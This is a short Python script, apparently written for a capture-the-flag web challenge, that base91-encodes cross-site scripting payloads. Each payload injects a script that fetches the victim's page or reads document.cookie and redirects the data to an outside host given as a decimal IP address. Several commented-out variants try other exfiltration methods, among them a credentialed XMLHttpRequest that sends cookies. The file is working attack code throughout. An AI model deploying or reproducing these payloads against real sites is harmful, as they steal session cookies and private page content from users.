import based91

# ip = "52627496"

def create_encoding(): 
    global cookies
    encoded = '</h2><script>fetch("/")["then"](response=>response["text"]())["then"](text=>{var/**/l=text["search"]("/e/");window["location"]["href"]="http://52627496/?d="+text["substring"](l,l+50);});</script>////'
    decoded = based91.decode(encoded) 
    print("[*] decoded\n",decoded.hex())
    print("[*] origin\n",based91.encode(decoded))
    
    encoded = '</h2><script>fetch("/e/98def9f5621fc998b913aea476639ebd1a862c43")["then"](response=>response["text"]())["then"](text=>{var/**/l=text["search"]("subtitle");window["location"]["href"]="http://52627496/?d="+text["substring"](l,l+50);});</script>////'
    decoded = based91.decode(encoded) 
    print("[*] decoded\n",decoded.hex())
    print("[*] origin\n",based91.encode(decoded))
    
# encoded = '</h2><script>var/**/test="";fetch("/")["then"](response=>response["text"]())["then"](text=>{test=text["substring"](50,52);});window["location"]["href"]="http://52627496/?d="+test</script>////'
# encoded = '</h2><script>fetch("/")["then"](response=>response["text"]())["then"](text=>{window["location"]["href"]="http://52627496/?d="+text["substring"](50,52);});</script>////'
# encoded = '</h2><script>fetch("/")["then"](response=>response["text"]())["then"](text=>{window["location"]["href"]="http://52627496/?d="+text;});</script>////'
# encoded = f'<script>window["location"]["href"]="http://{ip}/?d="+fetch("/")["then"](response=>response["text"]())["then"](text=>text);</script>//'
# encoded = '<script>var/**/test="";await/**/fetch("/")["then"](response=>response["text"]())["then"](text=>{test=text});window["location"]["href"]="http://52627496/?d="+test;</script>////'
# encoded = '<script>var/**/req=new/**/XMLHttpRequest();req["withCredentials"]=true;req["open"]("GET","http://52627496/?d="+document["cookie"],false);req["send"]();</script>//'
# encoded = '</h2><script>var/**/test="";fetch("/")["then"](response=>response["text"]())["then"](text=>{test=text});window["location"]["href"]="http://52627496/?d="+test;</script>///'
# encoded = f'</h2><script>window["location"]["href"]="http://{ip}/?d="+document["cookie"];</script>////'
# encoded = f'</h2><script>window["location"]["href"]="http://{ip}/?d="+test;</script>////'

if __name__ == '__main__':
    create_encoding()
